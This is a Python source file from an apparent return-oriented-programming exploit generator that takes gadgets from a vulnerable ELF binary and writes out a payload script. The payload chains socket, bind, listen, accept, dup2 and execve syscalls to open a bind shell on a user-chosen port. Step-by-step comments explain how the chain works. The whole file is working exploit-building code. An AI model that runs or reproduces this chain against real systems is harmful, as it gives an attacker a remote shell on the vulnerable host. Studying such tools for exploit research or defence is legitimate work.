from elftools.elf.elffile import ELFFile
import capstone
import struct
import sys
import socket

import general
import print_pretty
import categorize
import get_gadgets
import chain

def bindshellROPChain(GadgetList, vulnExecutable): 

    print("\n\n-->Chaining to get a shell using execve system call")

    fd = open(vulnExecutable, "rb")
    elffile = ELFFile(fd)
    data_section = ".data"
    section = elffile.get_section_by_name(data_section)

    # We need .data section's details because we have to write "/bin//sh" into it. 
    data_section_addr = section["sh_addr"]
    data_section_size = section["sh_size"]

    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    intList = categorize.checkIfIntPresent(GadgetList)

    if len(intList) == 0 and len(syscallList) == 0: 
        print("No int 0x80, no syscall, no ROP")
        print("Exiting tool :(")
        sys.exit()
    
    
    if len(syscallList) > 0 : 
        exploit(GadgetList, data_section_addr)
        sys.exit()

# Steps to get a bind shell: 
#
# 1. The following structure should be filled and written somewhere. 
#
#   struct sockaddr_in {
#       short            sin_family;   // e.g. AF_INET, AF_INET6
#       unsigned short   sin_port;     // e.g. htons(3490)
#       struct in_addr   sin_addr;     // see struct in_addr, below
#       char             sin_zero[8];  // zero this if you want to
#   };
#
#   struct in_addr {
#       unsigned long s_addr;          // load with inet_pton()
#   };
#
#
# 2. It is important to note that all elements in a structure are placed one after the other.
#    So, in memory, this structure looks like this: 
#
#   < sin_family - 2 bytes >< sin_port - 2 bytes >< IP Address - 4 bytes >< zero - 8 bytes >
# 
# 3. Idea is to write this onto .data section. 
# 
# 4. Create a socket using "socket" system call
# 
#    rax = socket(AF_INET, SOCK_STREAM, 0);
# 
# 5. Should somehow load value in rax to rdi.
# 
# 6. Execute "bind" system call
#      
#    bind(rdi, data_section_addr, 16)
# 
# 7. Execute "listen" system call
# 
#    listen(rdi, 0)
# 
# 8. Execute "accept" system call
# 
#    rax = accept(rdi, 0, 0)
# 
# 9. Copy rax into rdi again. 
#
# 10. Execute "dup2" system call and redirect stdin, stdout and stdout to new socket with fd = rdi.
# 
#    dup2(rdi, 0)
#    dup2(rdi, 1)
#    dup2(rdi, 2)
# 
# 11. Execute execve("/bin//sh", 0, 0) - refer to execveChain.py for details. 
#  

def exploit(GadgetList, data_section_addr) : 

    # Open the file where payload will be written in the form of a python script
    fd = open("bindshellROPChain.py", "w")
    chain.writeHeader(fd)

    # ip_addr = str(input("Enter IP Address: "))
    port = int(input("Enter port Number: "))

    # sin_family = AF_INET
    # Refering to /usr/include/bits/socket.h for value of AF_INET
    # AF_INET = 2

    sockaddr = b''
    sockaddr += b'\x02\x00'  # AF_INET = 2
    sockaddr += struct.pack('<H', socket.htons(port))  # htons(port)
    sockaddr += socket.inet_pton(socket.AF_INET, "0.0.0.0") #  inet_pton(AF_INET, ip_addr)
    sockaddr += struct.pack('<Q', 0)    # sin_zero - 8 zeros

    # sockaddr structure ready

    # Writing sockaddr structure onto .data section
    chain.WriteStuffIntoMemory(sockaddr, data_section_addr, fd)

    # Execute socket() system call
    # Note: rax will have the file descriptor of the new socket
    
    # socket's system call number = 41
    chain.LoadConstIntoReg(GadgetList, "rax", 41, fd)

    # rdi <- AF_INET
    # rdi <- 2
    # Refer to /usr/include/bits/socket.h for value
    chain.LoadConstIntoReg(GadgetList, "rdi", 2, fd)

    # rsi <- SOCK_STREAM
    # rsi <- 1
    # Refer to /usr/include/bits/socket_type.h for valule
    chain.LoadConstIntoReg(GadgetList, "rsi", 1, fd)

    # rdx <- 0
    chain.LoadConstIntoReg(GadgetList, "rdx", 0, fd)

    # Call "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")
    
    # If socket() is successful, rax will have file descriptor
    # Should somehow load it into rdi
    # rdi <- rax
    # How?
    # Should search for a "xchg rax, rdi" or "xchg rdi, rax" or "xchg edi, eax" or "xchg eax, edi"

    xchgList = categorize.queryGadgets(GadgetList, general.XCHANGE, "rdi")
    xchgList += categorize.queryGadgets(GadgetList, general.XCHANGE, "edi")

    xchgAD = dict()

    if len(xchgList) > 0 : 

        for List in xchgList: 
            gadget = List[0]

            if (("rax" in gadget['operands'] and "rdi" in gadget['operands']) or ("eax" in gadget['operands'] and "edi" in gadget['operands'])) : 
                xchgAD = gadget
                break
    
    if len(xchgAD) == 0: 
        print("No xchg gadgets found to load value of rax into rdi. so, Exploit fail!")
        sys.exit()
    
    # Execute xchg between rdi and rax => rdi has socket's file descriptor now. 
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(xchgAD['address'])))
    fd.write(")")
    fd.write("\t\t# Address of xchg Reg1, Reg2; ret")
    fd.write("\n\t")
    
    # Step-6: Execute bind() system call
    # bind(rdi, data_section_addr, 16)

    # rax <- 49
    # bind's system call number = 49
    chain.LoadConstIntoReg(GadgetList, "rax", 49, fd)

    # rdi <- file descriptor - already there

    # rsi <- data_section_addr
    chain.LoadConstIntoReg(GadgetList, "rsi", data_section_addr, fd)

    # rdx <- 16
    chain.LoadConstIntoReg(GadgetList, "rdx", 16, fd)

    # Call "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    # Assuming bind() is successful, we will continue

    # Step-7: listen(rdi, 0)

    # Load listen's system call number
    chain.LoadConstIntoReg(GadgetList, "rax", 50, fd)
    
    # rdi <- file descriptor - already there

    # rsi <- 0 
    chain.LoadConstIntoReg(GadgetList, "rsi", 0, fd)

    # Call "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")
    
    # Listen done. 

    # Step-8: accept(rdi, 0, 0) system call

    # Load accept()'s system call number
    chain.LoadConstIntoReg(GadgetList, "rax", 43, fd)

    # rdi is set.

    chain.LoadConstIntoReg(GadgetList, "rsi", 0, fd)
    chain.LoadConstIntoReg(GadgetList, "rdx", 0, fd)

    # Call "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")
    

    # Now, accept() is waiting for connections. 

    # Suppose I get connected, a new socket is created with file descriptor in rax. That should be loaded into rdi again. 
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(xchgAD['address'])))
    fd.write(")")
    fd.write("\t\t# Address of xchg Reg1, Reg2; ret")
    fd.write("\n\t")
    
    # Redirect stdin, stdout, stderr to that new socket using dup2() system call
    # dup2(rdi, 0)

    chain.LoadConstIntoReg(GadgetList, "rax", 33, fd)

    # stdin
    chain.LoadConstIntoReg(GadgetList, "rsi", 0, fd)

    # Call "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")
    
    # stdout
    chain.LoadConstIntoReg(GadgetList, "rax", 33, fd)

    chain.LoadConstIntoReg(GadgetList, "rsi", 1, fd)
    
    # Call "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    # stderr
    chain.LoadConstIntoReg(GadgetList, "rax", 33, fd)

    chain.LoadConstIntoReg(GadgetList, "rsi", 2, fd)
    
    # Call "syscall; ret"
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")
    
    # Now, all redirection is done. 

    # Let us spawn a shell - refer execveChain.py

    binsh = 0x68732f2f6e69622f
    # binsh = 0x6873000000000000
    binsh = struct.pack('<Q', binsh)
    binsh = b'/bin/bash'
    # print(binsh)
    chain.WriteStuffIntoMemory(binsh, data_section_addr + 20, fd)
 
    # Step-1: rax <- 59
    chain.LoadConstIntoReg(GadgetList, "rax", 59, fd)

	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
    chain.LoadConstIntoReg(GadgetList, "rdi", data_section_addr + 20, fd)

	# Step-4: rsi <- 0
    chain.LoadConstIntoReg(GadgetList, "rsi", 0, fd)

    # Step-5: rdx <- 0
    chain.LoadConstIntoReg(GadgetList, "rdx", 0, fd)


    # Get syscall
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")


    chain.writeFooter(fd)
    print("-->Written the complete payload in bindshellROPChain.py")
    print("-->Chaining successful!")
